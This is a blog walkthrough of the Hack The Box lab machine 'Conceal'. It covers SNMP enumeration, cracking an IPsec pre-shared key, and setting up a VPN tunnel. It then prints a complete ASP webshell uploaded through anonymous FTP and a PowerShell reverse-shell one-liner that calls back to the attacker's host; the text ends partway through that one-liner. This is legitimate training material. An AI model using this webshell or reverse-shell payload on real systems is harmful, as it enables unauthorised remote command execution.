<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Conceal - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Conceal from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Conceal">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/conceal/">


  <meta property="og:description" content="My write-up / walkthrough for Conceal from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Conceal">
  <meta name="twitter:description" content="My write-up / walkthrough for Conceal from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/conceal/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-05-18T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/conceal/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Conceal">
    <meta itemprop="description" content="Hack The Box - Conceal">
    <meta itemprop="datePublished" content="2019-05-18T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/conceal/" class="u-url" itemprop="url">Hack The Box - Conceal
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-05-18T07:00:00+02:00">May 18, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          11 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---conceal">Hack The Box - Conceal</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#snmp-enumeration">Snmp Enumeration</a></li>
<li><a href="#ike-scan-setting-up-the-connection">ike-scan, Setting up The Connection</a></li>
<li><a href="#nmap-second-time">Nmap (Second Time)</a></li>
<li><a href="#ftp-file-upload-reverse-shell-and-user-flag">FTP, File Upload, Reverse Shell and User Flag</a></li>
<li><a href="#seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag">SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---conceal">Hack The Box - Conceal</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining <a href="https://en.wikipedia.org/wiki/IPsec" target="_blank" rel="noopener noreferrer">IPSEC</a> connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.116</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">conceal.htb</code>. Let’s jump right in.<br>
<br><img src="/images/hackthebox/conceal/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services.<br>
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
<br><img src="/images/hackthebox/conceal/1.png" alt="" class="align-center"><br><br>
And we got nothing !
<br>I ran another <code class="language-plaintext highlighter-rouge">nmap</code> UDP scan on all ports :
<br><code class="language-plaintext highlighter-rouge">nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0</code>
<br>The output was too long so I will show the only important part :
<br><img src="/images/hackthebox/conceal/2.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/conceal/3.png" alt="" class="align-center"><br><br>
It was not sure about port 161, but it showed that port 500 is open.<br>
I ran a third scan on ports 500 and 161 :
<code class="language-plaintext highlighter-rouge">nmap -p 161,500 -sV -sU -sC conceal.htb</code>
<br><img src="/images/hackthebox/conceal/4.png" alt="" class="align-center"><br><br>
Full Output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
Nmap scan report for conceal.htb (10.10.10.116)
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:65496   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:65497      *:*
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   308: 
|     Name: smss.exe
|   348: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   392: 
|     Name: csrss.exe
|   468: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   472: 
|     Name: wininit.exe
|   484: 
|     Name: csrss.exe
|   564: 
|     Name: winlogon.exe
|   584: 
|     Name: services.exe
|   616: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   696: 
|     Name: fontdrvhost.exe
|   704: 
|     Name: fontdrvhost.exe
|   712: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   812: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   900: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   908: 
|     Name: dwm.exe
|   940: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   976: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   984: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   1140: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1232: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1248: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   1292: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
|   1392: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1400: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1492: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1728: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1748: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1788: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1856: 
|     Name: SecurityHealthService.exe
|   1868: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1892: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1912: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1932: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1956: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1980: 
|     Name: MsMpEng.exe
|   2068: 
|     Name: Memory Compression
|   2204: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   2444: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2952: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   2976: 
|     Name: NisSrv.exe
|   3052: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3132: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   3280: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   3376: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3948: 
|     Name: svchost.exe
|   5004: 
|     Name: SearchFilterHost.exe
|     Path: C:\Windows\system32\
|     Params:  0 700 704 712 8192 708 
|   5032: 
|     Name: SearchProtocolHost.exe
|     Path: C:\Windows\system32\
|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 "Software\Microsoft\Windows Search" "Moz
| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 2h08m26.61s (770661 timeticks)
| snmp-win32-services: 
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Client License Service (ClipSVC)
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Account Sign-in Assistant
|   Microsoft FTP Service
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Tile Data model server
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Workstation
|_  World Wide Web Publishing Service
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
|_  VMware Tools; 2018-10-12T20:11:02
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
500/udp open  isakmp  Microsoft Windows 8
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
</code></pre></div></div>
<p>We have two services to enumerate. <code class="language-plaintext highlighter-rouge">isakmp</code> which is <code class="language-plaintext highlighter-rouge">IPSEC</code> and <code class="language-plaintext highlighter-rouge">snmp</code>.<br></p>

<h2 id="snmp-enumeration">Snmp Enumeration</h2>
<p>I started with <code class="language-plaintext highlighter-rouge">snmpwalk</code> : 
<code class="language-plaintext highlighter-rouge">snmpwalk -c public -v 1 conceal.htb</code>
The output was very long but we only need this first part : 
<br><img src="/images/hackthebox/conceal/5.png" alt="" class="align-center"><br><br>
We have a password hash for the <code class="language-plaintext highlighter-rouge">IPSEC</code> connection : <code class="language-plaintext highlighter-rouge">9C8B1A372B1878851BE2C097031B6E43</code>
I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack it and I got this result :
<br><img src="/images/hackthebox/conceal/6.png" alt="" class="align-center"><br><br>
Great ! Now we need to enumerate the <code class="language-plaintext highlighter-rouge">ike</code> vpn service to know how to connect to it.<br></p>

<h2 id="ike-scan-setting-up-the-connection">
<code class="language-plaintext highlighter-rouge">ike-scan</code>, Setting up The Connection</h2>
<p>I ran <code class="language-plaintext highlighter-rouge">ike-scan</code> and got these results :
<br><img src="/images/hackthebox/conceal/7.png" alt="" class="align-center"><br><br>
I installed <code class="language-plaintext highlighter-rouge">strongswan</code> to set up the <code class="language-plaintext highlighter-rouge">IPSEC</code> connection. With the help of the info I got from <code class="language-plaintext highlighter-rouge">ike-scan</code> and some guessing I could come up with this configuration which worked : 
<code class="language-plaintext highlighter-rouge">/etc/ipsec.conf</code> :
<br><img src="/images/hackthebox/conceal/8.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conn rick-to-conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.xx.xx
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/etc/ipsec.secrets</code> :
<br><img src="/images/hackthebox/conceal/9.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx 10.10.10.116 : PSK "Dudecake1!"
</code></pre></div></div>
<p>I started <code class="language-plaintext highlighter-rouge">ipsec</code> then I initialized the connection :
<code class="language-plaintext highlighter-rouge">ipsec start</code>
<code class="language-plaintext highlighter-rouge">ipsec up rick-to-conceal</code>
<br><img src="/images/hackthebox/conceal/10.png" alt="" class="align-center"><br><br>
It worked fine, now we are connected to a vpn network let’s see what new services can we get.<br></p>

<h2 id="nmap-second-time">Nmap (Second Time)</h2>
<p><code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
<br><img src="/images/hackthebox/conceal/11.png" alt="" class="align-center"><br><br>
We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.<br></p>

<h2 id="ftp-file-upload-reverse-shell-and-user-flag">FTP, File Upload, Reverse Shell and User Flag</h2>
<p><br><img src="/images/hackthebox/conceal/12.png" alt="" class="align-center"><br><br>
It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.<br>
<br><img src="/images/hackthebox/conceal/13.png" alt="" class="align-center"><br><br>
I Checked the http service and there was only the default IIS page :
<br><img src="/images/hackthebox/conceal/14.png" alt="" class="align-center"><br><br>
I ran <code class="language-plaintext highlighter-rouge">gobuster</code> with <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and got only one directory called <code class="language-plaintext highlighter-rouge">/upload</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://conceal.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/17 17:18:57 Starting gobuster
=====================================================
/upload (Status: 301)
=====================================================
2019/05/17 17:28:23 Finished
=====================================================
</code></pre></div></div>
<p>I went to <code class="language-plaintext highlighter-rouge">/upload</code> and found my test file : 
<br><img src="/images/hackthebox/conceal/15.png" alt="" class="align-center"><br><br>
Great ! I uploaded an <code class="language-plaintext highlighter-rouge">asp</code> shell to get remote code execution : 
<br><img src="/images/hackthebox/conceal/16.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">shell.asp</code> :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
--&gt;</span>


<span class="nt">&lt;</span><span class="err">%</span>
<span class="na">Set</span> <span class="na">oScript = </span><span class="s">Server.CreateObject("WSCRIPT.SHELL")</span>
<span class="na">Set</span> <span class="na">oScriptNet = </span><span class="s">Server.CreateObject("WSCRIPT.NETWORK")</span>
<span class="na">Set</span> <span class="na">oFileSys = </span><span class="s">Server.CreateObject("Scripting.FileSystemObject")</span>
<span class="na">Function</span> <span class="na">getCommandOutput</span><span class="err">(</span><span class="na">theCommand</span><span class="err">)</span>
    <span class="na">Dim</span> <span class="na">objShell</span><span class="err">,</span> <span class="na">objCmdExec</span>
    <span class="na">Set</span> <span class="na">objShell = </span><span class="s">CreateObject("WScript.Shell")</span>
    <span class="na">Set</span> <span class="na">objCmdExec = </span><span class="s">objshell.exec(thecommand)</span>
    <span class="na">getCommandOutput = </span><span class="s">objCmdExec.StdOut.ReadAll</span>
<span class="na">end</span> <span class="na">Function</span>
<span class="err">%</span><span class="nt">&gt;</span>


<span class="nt">&lt;HTML&gt;</span>
<span class="nt">&lt;BODY&gt;</span>
<span class="nt">&lt;FORM</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"cmd"</span> <span class="na">size=</span><span class="s">45</span> <span class="na">value=</span><span class="s">"&lt;%= szCMD %&gt;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Run"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/FORM&gt;</span>
<span class="nt">&lt;PRE&gt;</span>
<span class="nt">&lt;</span><span class="err">%=</span> <span class="err">"\\"</span> <span class="err">&amp;</span> <span class="na">oScriptNet.ComputerName</span> <span class="err">&amp;</span> <span class="err">"\"</span> <span class="err">&amp;</span> <span class="na">oScriptNet.UserName</span> <span class="err">%</span><span class="nt">&gt;</span>
<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response.Write</span><span class="err">(</span><span class="na">Request.ServerVariables</span><span class="err">("</span><span class="na">server_name</span><span class="err">"))%</span><span class="nt">&gt;</span>
<span class="nt">&lt;p&gt;</span>
<span class="nt">&lt;b&gt;</span>The server's port:<span class="nt">&lt;/b&gt;</span>
<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response.Write</span><span class="err">(</span><span class="na">Request.ServerVariables</span><span class="err">("</span><span class="na">server_port</span><span class="err">"))%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
<span class="nt">&lt;b&gt;</span>The server's software:<span class="nt">&lt;/b&gt;</span>
<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response.Write</span><span class="err">(</span><span class="na">Request.ServerVariables</span><span class="err">("</span><span class="na">server_software</span><span class="err">"))%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
<span class="nt">&lt;b&gt;</span>The server's software:<span class="nt">&lt;/b&gt;</span>
<span class="nt">&lt;</span><span class="err">%</span><span class="na">Response.Write</span><span class="err">(</span><span class="na">Request.ServerVariables</span><span class="err">("</span><span class="na">LOCAL_ADDR</span><span class="err">"))%</span><span class="nt">&gt;</span>
<span class="nt">&lt;</span><span class="err">%</span> <span class="na">szCMD = </span><span class="s">request("cmd")</span>
<span class="na">thisDir = </span><span class="s">getCommandOutput("cmd</span> <span class="err">/</span><span class="na">c</span><span class="err">"</span> <span class="err">&amp;</span> <span class="na">szCMD</span><span class="err">)</span>
<span class="na">Response.Write</span><span class="err">(</span><span class="na">thisDir</span><span class="err">)%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;/BODY&gt;</span>
<span class="nt">&lt;/HTML&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/conceal/17.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/conceal/18.png" alt="" class="align-center"><br><br>
I got a powershell reverse shell : 
<br><img src="/images/hackthebox/conceal/19.png" alt="" class="align-center"><br><br>
Payload :</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span 